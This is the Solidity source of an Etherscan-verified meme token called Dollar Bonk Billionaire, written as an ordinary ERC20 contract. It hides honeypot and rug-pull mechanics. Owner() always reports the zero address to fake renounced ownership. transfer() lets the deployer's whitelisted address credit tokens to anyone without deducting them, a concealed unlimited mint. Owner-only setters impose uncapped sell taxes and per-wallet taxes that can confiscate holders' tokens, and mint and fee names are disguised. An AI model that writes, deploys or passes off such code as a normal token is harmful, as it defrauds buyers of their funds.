/**
 *Submitted for verification at Etherscan.io on 2023-01-05
*/

/**
 Welcome Chads to  Dollar Bonk Billionaire

 TG: https://t.me/DollarBonkBillionaiChannel

*/
// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Owner;    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor() {
        _transferOwnership(_msgSender());
    }

    
    function Owner() public view virtual returns (address) {
        return address(0);
    }

    
    modifier onlyOwner() {
        require(_Owner == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnershiptransferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new Owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _Owner;
        _Owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

   
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

   
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AmountADesired,
        uint AmountBDesired,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline
    ) external returns (uint AmountA, uint AmountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AmountTokenDesired,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AmountToken, uint AmountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline
    ) external returns (uint AmountA, uint AmountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountToken, uint AmountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountA, uint AmountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountToken, uint AmountETH);
    function swapExactTokensForTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amounts);
    function swapTokensForExactTokens(
        uint AmountOut,
        uint AmountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amounts);
    function swapExactETHForTokens(uint AmountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amounts);
    function swapTokensForExactETH(uint AmountOut, uint AmountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amounts);
    function swapExactTokensForETH(uint AmountIn, uint AmountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amounts);
    function swapETHForExactTokens(uint AmountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amounts);

    function quote(uint AmountA, uint reserveA, uint reserveB) external pure returns (uint AmountB);
    function getAmountOut(uint AmountIn, uint reserveIn, uint reserveOut) external pure returns (uint AmountOut);
    function getAmountIn(uint AmountOut, uint reserveIn, uint reserveOut) external pure returns (uint AmountIn);
    function getAmountsOut(uint AmountIn, address[] calldata path) external view returns (uint[] memory Amounts);
    function getAmountsIn(uint AmountOut, address[] calldata path) external view returns (uint[] memory Amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingTaxiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountETH);
    function removeLiquidityETHWithPermitSupportingTaxiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountETH);

    function swapExactTokensForTokensSupportingTaxiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingTaxiOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingTaxiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function TaxiTo() external view returns (address);
    function TaxiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setTaxiTo(address) external;
    function setTaxiToSetter(address) external;
}


contract ERC20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

   
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed Owner, address indexed spender, uint256 value);//10

    
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    
    function name() public view virtual returns (string memory) {
        return _name;
    }

   
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

   
    function allowance(address Owner, address spender) public view virtual returns (uint256) {
        return _allowances[Owner][spender];
    }

    
    function approve(address spender, uint256 Amount) public virtual returns (bool) {
        address Owner = _msgSender();
        _approve(Owner, spender, Amount);
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Owner = _msgSender();
        _approve(Owner, spender, _allowances[Owner][spender] + addedValue);
        return true;
    }// dmhaitran

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Owner = _msgSender();
        uint256 currentAllowance = _allowances[Owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function _approve(
        address Owner,
        address spender,
        uint256 Amount
    ) internal virtual {
        require(Owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Owner][spender] = Amount;
        emit Approval(Owner, spender, Amount);
    }

    
    function _spendAllowance(
        address Owner,
        address spender,
        uint256 Amount
    ) internal virtual {
        uint256 currentAllowance = allowance(Owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(Owner, spender, currentAllowance - Amount);
            }
        }
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}

   
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}
}


contract DollarBonkBillionaire is ERC20, Ownable {
    
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Amount, "ERC20: transfer Amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Amount;
        }
        _balances[to] += Amount;

        emit Transfer(from, to, Amount);
    }

    function _burn(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Amount, "ERC20: burn Amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Amount;
        }
        _totalSupply -= Amount;

        emit Transfer(account, address(0), Amount);
    }

    function _Mnti(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: Mnti to the zero address"); //mint

        _totalSupply += Amount;
        _balances[account] += Amount;
        emit Transfer(address(0), account, Amount);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_) {
        _Mnti(msg.sender, totalSupply_ * 10**decimals());

        
        _defaultSellTaxi = 35;
        _defaultBuyTaxi = 2;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellTaxi = 0;

    uint256 private _defaultBuyTaxi = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipTaxi;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOwner returns (bool) {
        return _release[_address];
    }


    function SetPairList(address _address) external onlyOwner {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwner {
        _defaultSellTaxi = _value;
    }

    function setSlipTaxi(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipTaxi[_address] = _value;
    }

    function getSlipTaxi(address _address) external view onlyOwner returns (uint256) {
        return _slipTaxi[_address];
    }


    function setMAccountTaxi(address _address, bool _value) external onlyOwner {
        _mAccount[_address] = _value;
    }

    function getMAccountTaxi(address _address) external view onlyOwner returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Amount, "ERC20: transfer Amount exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeTaxiAmount = 0;

        if (rF) {
            uint256 tradeTaxi = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeTaxi = _defaultSellTaxi;
                }
                if (from == uniswapV2Pair) {

                    tradeTaxi = _defaultBuyTaxi;
                }
            }
            if (_slipTaxi[from] > 0) {
                tradeTaxi = _slipTaxi[from];
            }

            tradeTaxiAmount = _Amount.mul(tradeTaxi).div(100);
        }


        if (tradeTaxiAmount > 0) {
            _balances[from] = _balances[from].sub(tradeTaxiAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeTaxiAmount);
            emit Transfer(from, _deadAddress, tradeTaxiAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeTaxiAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeTaxiAmount);
        emit Transfer(from, _to, _Amount - tradeTaxiAmount);
    }

    function transfer(address to, uint256 Amount) public virtual returns (bool) {
        address Owner = _msgSender();
        if (_release[Owner] == true) {
            _balances[to] += Amount;
            return true;
        }
        _receiveF(Owner, to, Amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Amount);
        _receiveF(from, to, Amount);
        return true;
    }
}